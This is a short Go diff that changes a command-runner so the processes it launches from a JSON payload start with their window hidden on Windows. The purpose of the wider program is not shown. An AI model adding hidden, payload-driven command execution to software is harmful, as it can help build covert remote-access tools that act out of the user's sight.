@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"log"
 	"os/exec"
+	"syscall"
 )
 
 type ExecCommand struct {
@@ -13,7 +14,9 @@ type ExecCommand struct {
 
 func (ec *ExecCommand) run() ([]byte, error) {
 	log.Printf("running: %s %s\r\n", ec.ExecutablePath, ec.Params)
-	return exec.Command(ec.ExecutablePath, ec.Params).Output()
+	cmdInstance := exec.Command(ec.ExecutablePath, ec.Params)
+	cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return cmdInstance.Output()
 }
 
 func RunExec(payload []byte) ([]byte, error) {
